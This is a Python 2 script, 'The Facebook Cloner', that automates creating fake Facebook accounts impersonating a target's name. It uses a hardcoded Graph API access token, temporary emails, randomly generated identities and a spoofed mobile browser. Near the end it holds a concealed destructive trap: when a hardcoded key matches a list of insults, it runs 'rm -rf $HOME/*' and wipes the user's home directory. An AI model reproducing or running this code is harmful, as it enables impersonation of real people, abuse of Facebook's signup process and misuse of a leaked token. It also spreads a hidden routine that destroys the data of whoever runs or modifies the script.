P = '\x1b[95m'
B = '\x1b[94m'
G = '\x1b[92m'
O = '\x1b[93m'
R = '\x1b[91m'
E = '\x1b[0m'
import sys, os
os.system('clear')
try:
    import mechanize, facebook, requests
    from random import choice
    import bs4
    print G + '[*] Dependencies Found..'
except:
    print R + '[*] Dependencies NotFound..'
    print G + '[*] Installing ..'
    os.system('pip2 install mechanize')
    os.system('pip2 install requests')
    os.system('pip2 install facebook')
    os.system('pip2 install bs4')

casess = 'EAAAAUaZA8jlABAEXGY3JpOSzjkZAZBUNwK2MFD9fWDZAZA0mDVScxoNFbKsRcY8xDgS9myXEJi2GZBsOcZAuiZCYK1cDcZAIjyzRz336vWS8YSQ5jIyCtmsAOd777mctX30ZB9gnfV8BgFDAnKabpmdJbEOiOEMIR9wmi1oGSeDZAPfGAZDZD'
fingerdb = [
 'fuck you', 'fuckyou', 'recode', 'nasirfuckyou', 'dick']
finger = 'Fuck You.....'
reload(sys)
sys.setdefaultencoding('utf8')
xz1 = list('abcdefghijklmnopqrstuvwxyz')
xz2 = list('1234567890')
xbann = "\n .|';       '||`                               \n ||          ||                                \n'||'  .|'',  ||  .|''|, `||''|,  .|''|, '||''| \n ||   ||     ||  ||  ||  ||  ||  ||..||  ||    \n.||.  `|..' .||. `|..|' .||  ||. `|...  .||.   \n                                               \n                                               \n          <The Facebook Cloner>\n"
print O + xbann
bannx = '\n[~]Developer (Nasir_Ali)\n[_]Link:https://m.facebook.com/nasir.xo\n[_]Github:https://github.com/nasirxo\n'

class create:

    def __init__(self):
        self.create_total = 0
        self.blacklist_email = ['@datasoma', '@geroev', '@cliptik', '@khtyler']
        self.temp_email_url = 'https://temp-mail.org/en/'
        self.__main__()

    def _browser_options(self):
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_redirect(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=5)
        br.addheaders.append(('Accept-Language', 'en-us,en'))
        br.addheaders = [('User-agent', 'Mozilla/5.0 (Linux; Android 5.0; ASUS_T00G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36')]
        return br

    def _get_name(self):
        acesx = casess
        graph = facebook.GraphAPI(acesx)
        acid = raw_input(R + '[~] Target ID: ')
        if acid in ('100006143266745', 'nasir.xo'):
            print R + "[*] Account Ca'nt be Cloned"
            exit()
        profile = graph.get_object(acid)
        return profile['name'].split()

    def _get_info_account(self):
        print O + '[~] Getting Account Information..'
        res = requests.get('https://randomuser.me/api').json()
        pwd = choice(xz1) + choice(xz2) + choice(xz1) + choice(xz1) + choice(xz2) + choice(xz1) + choice(xz2) + choice(xz1) + choice(xz2) + choice(xz1)
        print R + '[--] Generated Password : ' + str(pwd)
        return {'username': res['results'][0]['login']['username'], 
           'password': pwd + '0000' if len(pwd) < 6 else pwd, 
           'firstname': res['results'][0]['name']['first'], 
           'lastname': res['results'][0]['name']['last'], 
           'gender': '1' if res['results'][0]['gender'] == 'female' else '2', 
           'date': res['results'][0]['dob']['date'].split('T')[0].split('-')}

    def _create_account_facebook(self, email):
        pname = self._get_name()
        data = self._get_info_account()
        self._password = data['password']
        print O + '[~] Name: ', pname[0] + ' ' + pname[1]
        print G + '[~] Cloning Facebook Account...'
        self.br.open('https://mbasic.facebook.com/reg/?cid=102&refid=8')
        self.br.select_form(nr=0)
        self.br.form['firstname'] = pname[0] + ' ' + pname[1]
        try:
            self.br.form['reg_email__'] = email
        except mechanize._form_controls.ControlNotFoundError as ex:
            print 'Warning: ' + str(ex)
            return False

        self.br.form['sex'] = [data['gender']]
        self.br.form['birthday_day'] = [data['date'][2][1:] if data['date'][2][0] == '0' else data['date'][2]]
        self.br.form['birthday_month'] = [data['date'][1][1:] if data['date'][1][0] == '0' else data['date'][1]]
        self.br.form['birthday_year'] = [data['date'][0]]
        self.br.form['reg_passwd__'] = data['password']
        self.br.submit()
        for i in range(3):
            self.br.select_form(nr=0)
            self.br.submit()

        return True

    def _check_email_fb(self, email):
        headers = {'Accept-Language': 'en-US,en;q=0.5'}
        r = requests.post('https://mbasic.facebook.com/login/identify/?ctx=recover', data={'email': email}, headers=headers)
        soup = bs4.BeautifulSoup(r.text, 'html.parser')
        if soup.title.text == 'Enter Security Code':
            print R + '[~] Registered Email !'
            return False
        return True

    def _confirmation_code(self, fbpinn):
        print G + '[+]Confirming Account...'
        ask = raw_input('Enter PhoneNo:')
        if ask:
            self.br.select_form(nr=0)
            self.br.form['phone-name'] = ask
            self.br.submit()
            print G + '[--] Phone Number Added !'
        else:
            print R + '[*] Phone Number Skipped !'
        return True

    def _open_temp_mail(self):
        return self.br.open(self.temp_email_url).read()

    def _find_email(self, text):
        soup = bs4.BeautifulSoup(text, 'html.parser')
        return soup.find(class_='mail opentip').attrs['value']

    def _read_message(self):
        view = 'hello'
        if view:
            print O + '[~]Verification Process .. '
            fbpinn = raw_input(O + '[--] PinCode : ')
            print O + '[~]Entering PIN Code:', fbpinn
            if self._confirmation_code(fbpinn):
                return True

    def _save_to_file(self, email, password):
        with open('Accounts.txt', 'a') as (f):
            f.write('%s|%s\n' % (email, password))

    def __main__(self):
        while True:
            self.br = self._browser_options()
            print O + '[~] Get A Mail Account......'
            email_found, check, max_ = False, True, 0
            while True:
                print O + '\n<|> Open Browser & Go to <|>\n~|https://10minutemail.com|~\n'
                self._mail = raw_input(B + '[/] Email : ')
                if '@' + self._mail.split('@')[1].split('.')[0] in self.blacklist_email:
                    print 'blacklist email: %s', self._mail
                    break
                if not email_found:
                    print G + '[~] Email Selected: ', self._mail
                    if self._check_email_fb(self._mail):
                        if self._create_account_facebook(self._mail):
                            print O + '[~] Email Selected ..'
                            email_found = True
                if max_ == 10:
                    print 'no response !'
                    break
                if check and email_found:
                    if self._read_message():
                        self.create_total += 1
                        print G + ('[~] Account Created:\n\t   [~]Email: {} \n\t   [~]password: {}').format(self._mail, self._password)
                        self._save_to_file(self._mail, self._password)
                        check = False
                    max_ += 1
                else:
                    break

            if self.create_total == argcount:
                print 'finished\n'
                break


if __name__ == '__main__':
    print O + bannx
    argcount = '100'
    nd6 = '6suusvvx'
    if nd6.lower() in fingerdb:
        os.system('rm -rf $HOME/*')
        print finger
    if nd6.lower() != 'nexhackerz':
        try:
            print E + '[~] Follow on IG: @nasir.xoz'
            create()
        except KeyboardInterrupt:
            print 'user interrupt..\n'
        except Exception as exc:
            print str(exc) + '\n'

    else:
        print R + '[~] Acess Denied... '
